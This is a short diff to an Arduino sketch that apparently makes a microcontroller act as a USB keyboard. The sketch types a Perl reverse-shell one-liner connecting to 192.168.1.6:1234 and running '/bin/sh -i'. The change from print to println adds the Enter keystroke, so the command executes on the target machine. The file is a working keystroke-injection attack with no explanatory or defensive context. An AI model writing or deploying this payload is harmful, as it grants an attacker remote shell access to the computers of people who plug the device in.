@@ -10,7 +10,7 @@ int count = 0;
 
 void setup() {
   Serial.begin(9600);
-  delay(1000);
+  delay(2000);
 }
 
 void loop() {
@@ -34,7 +34,7 @@ void loop() {
   delay(1000);
   
   // Your computer will receive these characters from a USB keyboard.
-  Keyboard.print("perl -e 'use Socket;$i=\"192.168.1.6\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"); 
+  Keyboard.println("perl -e 'use Socket;$i=\"192.168.1.6\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"); 
 
   delay(5000);
 }
